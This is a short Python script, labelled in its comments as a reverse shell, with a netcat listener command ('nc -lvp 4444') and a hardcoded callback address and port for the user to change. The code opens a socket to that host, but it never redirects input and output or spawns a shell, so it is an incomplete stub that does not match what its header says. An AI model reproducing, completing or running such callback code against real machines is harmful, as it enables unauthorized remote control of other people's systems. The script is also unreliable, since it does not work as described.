# a python reverse shell
# set up a netcat listner
# nc -lvp 4444
# tested only on linux

import socket
import os
import subprocess
import pty

def connection():
    host = "192.168.1.238" # Change this to your IP
    port = 4444            # Change the port if you want to
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))   

connection()

